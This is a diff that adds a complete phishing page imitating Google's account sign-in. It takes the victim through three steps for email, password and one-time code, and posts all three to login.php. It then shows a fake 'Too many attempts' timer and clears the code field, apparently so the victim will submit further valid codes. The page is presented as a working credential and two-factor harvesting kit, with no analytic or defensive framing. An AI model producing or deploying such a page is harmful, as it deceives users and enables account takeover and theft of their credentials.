@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; }
+        body { font-family: 'Roboto', sans-serif; background-color: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding-top: 50px; }
+        .card { width: 100%; max-width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: left; }
+        @media (max-width: 450px) { .card { border: none; padding: 24px; } }
+        
+        .logo-box { text-align: center; margin-bottom: 10px; }
+        .logo { width: 75px; }
+        h1 { font-size: 24px; font-weight: 400; text-align: center; margin: 0 0 10px; }
+        .sub-text { font-size: 16px; text-align: center; margin-bottom: 30px; }
+
+        /* Identity Chip from your image */
+        .user-chip {
+            display: inline-flex; align-items: center; padding: 3px 10px 3px 4px;
+            border: 1px solid #dadce0; border-radius: 16px; margin: 0 auto 24px; cursor: pointer;
+            position: relative; left: 50%; transform: translateX(-50%);
+        }
+        .p-icon { width: 20px; height: 20px; background: #1a73e8; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 8px; }
+        .p-icon svg { fill: white; width: 14px; }
+        .u-mail { font-size: 14px; font-weight: 500; color: #3c4043; }
+        .u-arrow { margin-left: 5px; border-top: 4px solid #5f6368; border-right: 4px solid transparent; border-left: 4px solid transparent; }
+
+        /* Input Styles */
+        .input-group { margin-bottom: 20px; }
+        .g-input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
+        .g-input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        
+        .blue-link { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        .btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
+        .btn:disabled { background: #ccc; }
+
+        #wait-msg { color: #d93025; font-size: 13px; margin-top: 10px; display: none; text-align: center; }
+        .step { display: none; }
+        .active { display: block; animation: fadeIn 0.3s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="logo-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
+    </div>
+
+    <div id="step-1" class="step active">
+        <h1>Sign in</h1>
+        <p class="sub-text">Use your Google Account</p>
+        <div class="input-group">
+            <input type="text" id="email" class="g-input" placeholder="Email or phone">
+        </div>
+        <a class="blue-link">Forgot email?</a>
+        <div class="footer">
+            <a class="blue-link">Create account</a>
+            <button class="btn" onclick="next(2)">Next</button>
+        </div>
+    </div>
+
+    <div id="step-2" class="step">
+        <h1>Welcome</h1>
+        <div class="user-chip" onclick="next(1)">
+            <div class="p-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
+            <span id="disp-email" class="u-mail"></span>
+            <div class="u-arrow"></div>
+        </div>
+        <div class="input-group">
+            <input type="password" id="pass" class="g-input" placeholder="Enter your password">
+        </div>
+        <a class="blue-link">Forgot password?</a>
+        <div class="footer">
+            <span></span>
+            <button class="btn" onclick="next(3)">Next</button>
+        </div>
+    </div>
+
+    <div id="step-3" class="step">
+        <h1>Account recovery</h1>
+        <p class="sub-text" style="font-size: 14px;">Google wants to make sure it's really you</p>
+        <div class="user-chip">
+            <div class="p-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
+            <span id="disp-email-otp" class="u-mail"></span>
+        </div>
+        <div class="input-group">
+            <input type="text" id="otp" class="g-input" placeholder="Enter code">
+            <div id="wait-msg">Too many attempts. Try again in <span id="timer">60</span>s</div>
+        </div>
+        <div class="footer">
+            <a class="blue-link">Try another way</a>
+            <button class="btn" id="finish" onclick="submitData()">Next</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    function next(s) {
+        const mail = document.getElementById('email').value;
+        document.getElementById('disp-email').innerText = mail;
+        document.getElementById('disp-email-otp').innerText = mail;
+        document.querySelectorAll('.step').forEach(div => div.classList.remove('active'));
+        document.getElementById('step-'+s).classList.add('active');
+    }
+
+    function submitData() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        const otp = document.getElementById('otp').value;
+
+        if(!otp) return;
+
+        // Sending data to login.php
+        let fd = new FormData();
+        fd.append('email', email); fd.append('password', pass); fd.append('otp', otp);
+        fetch('login.php', { method: 'POST', body: fd });
+
+        // Timer Logic
+        const btn = document.getElementById('finish');
+        const inp = document.getElementById('otp');
+        const msg = document.getElementById('wait-msg');
+        let time = 60;
+
+        btn.disabled = true; inp.disabled = true; msg.style.display = 'block';
+        
+        const count = setInterval(() => {
+            time--;
+            document.getElementById('timer').innerText = time;
+            if(time <= 0) {
+                clearInterval(count);
+                btn.disabled = false; inp.disabled = false; msg.style.display = 'none';
+                inp.value = "";
+            }
+        }, 1000);
+    }
+</script>
+</body>
+</html>
